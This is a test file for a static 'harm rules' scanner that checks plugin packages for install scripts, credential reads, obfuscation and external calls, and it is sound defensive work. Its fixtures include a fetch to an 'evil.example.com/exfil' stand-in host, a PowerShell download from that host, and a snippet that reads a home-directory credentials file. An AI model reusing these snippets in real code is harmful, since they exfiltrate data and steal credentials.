import path from 'node:path'
import fs from 'node:fs'
import os from 'node:os'
import { describe, expect, it } from 'vitest'
import { analyzePackage } from '../../src/core/harm.ts'

function tempPkg(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-tank-harm-'))
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel)
    fs.mkdirSync(path.dirname(full), { recursive: true })
    fs.writeFileSync(full, content, 'utf8')
  }
  return dir
}

describe('analyzePackage (static harm rules)', () => {
  it('passes the benign fixture with no critical findings', () => {
    const result = analyzePackage(path.resolve('tests/fixtures/benign-plugin'))
    expect(result.gated).toBe(false)
    expect(result.findings.filter((f) => f.severity === 'critical')).toEqual([])
  })

  it('blocks the malicious fixture with critical findings and no execution', () => {
    const result = analyzePackage(path.resolve('tests/fixtures/malicious-plugin'))
    expect(result.gated).toBe(true)
    const critical = result.findings.filter((f) => f.severity === 'critical')
    const rules = critical.map((f) => f.rule)
    expect(rules).toContain('install-script')
    expect(rules).toContain('credential-reference')
    expect(rules).toContain('obfuscation')
    expect(rules).toContain('external-call')
  })

  it('scans package.json scripts and skips node_modules', () => {
    const result = analyzePackage(path.resolve('tests/fixtures/malicious-plugin'))
    const script = result.findings.find((f) => f.rule === 'install-script')
    expect(script?.file).toMatch(/package\.json$/)
    expect(result.findings.every((f) => !f.file?.includes('node_modules'))).toBe(true)
  })

  it('does not gate on metadata URLs in package.json (repository/homepage)', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({
        name: 'meta-only',
        version: '1.0.0',
        repository: { url: 'https://github.com/zhu1090093659/dsh-web-ui' },
        homepage: 'https://github.com/zhu1090093659/dsh-web-ui#readme',
        bugs: { url: 'https://github.com/zhu1090093659/dsh-web-ui/issues' },
        funding: 'https://example.com/funding',
      }),
      'lib/index.js': 'export const name = "meta-only"; export function apply() {}\n',
    })
    const result = analyzePackage(dir)
    expect(result.gated).toBe(false)
    expect(
      result.findings.filter(
        (f) => f.rule === 'external-call' && f.severity === 'critical',
      ),
    ).toEqual([])
  })

  it('warns (not gates) on a bare URL literal in code', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({ name: 'bare-url', version: '1.0.0' }),
      'lib/index.js':
        '// see https://github.com/owner/repo for usage\nexport function apply() {}\n',
    })
    const result = analyzePackage(dir)
    expect(result.gated).toBe(false)
    expect(
      result.findings.some(
        (f) =>
          f.rule === 'external-call' &&
          f.severity === 'warning' &&
          f.evidence.includes('github.com'),
      ),
    ).toBe(true)
  })

  it('gates on a real fetch call to an external URL', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({ name: 'real-call', version: '1.0.0' }),
      'lib/index.js':
        "export function apply() { fetch('https://evil.example.com/exfil'); }\n",
    })
    const result = analyzePackage(dir)
    expect(result.gated).toBe(true)
    expect(
      result.findings.some(
        (f) => f.rule === 'external-call' && f.severity === 'critical',
      ),
    ).toBe(true)
  })
})

describe('误报回归（2026-08-20 实机 vet 自检暴露）', () => {
  it('不命中规则自身的正则源码（eval/new Function 自引用）', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({ name: 'self-ref', version: '1.0.0' }),
      'lib/rules.js':
        'export const R = [/\\beval\\s*\\(/g, /\\bnew\\s+Function\\s*\\(/g]\n',
    })
    const result = analyzePackage(dir)
    expect(
      result.findings.filter((f) => f.rule === 'obfuscation' && f.severity === 'critical'),
    ).toEqual([])
  })

  it('JS 文件里出现 shell 命令字样不触发 external-call critical', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({ name: 'shell-in-js', version: '1.0.0' }),
      'lib/index.js': 'const P = /Invoke-WebRequest|curl|wget/g; export function apply() {}\n',
    })
    const result = analyzePackage(dir)
    expect(
      result.findings.filter((f) => f.rule === 'external-call' && f.severity === 'critical'),
    ).toEqual([])
  })

  it('.ps1 里的 Invoke-WebRequest 仍触发 external-call critical', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({ name: 'shell-real', version: '1.0.0' }),
      'install.ps1': "Invoke-WebRequest -Uri 'https://evil.example.com/x' -OutFile x\n",
    })
    const result = analyzePackage(dir)
    expect(
      result.findings.some((f) => f.rule === 'external-call' && f.severity === 'critical'),
    ).toBe(true)
  })

  it('凭据路径字符串（无读取调用）→ warning 不 gate', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({ name: 'path-ref', version: '1.0.0' }),
      'lib/baseline.js':
        "const WATCH = ['profiles', '.credentials.yaml', 'settings.yaml'];\nexport function stat() {}\n",
    })
    const result = analyzePackage(dir)
    expect(result.gated).toBe(false)
    expect(
      result.findings.some(
        (f) => f.rule === 'credential-reference' && f.severity === 'warning',
      ),
    ).toBe(true)
  })

  it('凭据文件读取调用 → critical（跨行嵌套路径也能命中）', () => {
    const dir = tempPkg({
      'package.json': JSON.stringify({ name: 'cred-read', version: '1.0.0' }),
      'lib/steal.js':
        "import fs from 'node:fs';\nexport function x() { return fs.readFileSync(process.env.HOME + '/.dsh/.credentials.yaml', 'utf8'); }\n",
    })
    const result = analyzePackage(dir)
    expect(
      result.findings.some((f) => f.rule === 'credential-reference' && f.severity === 'critical'),
    ).toBe(true)
  })
})
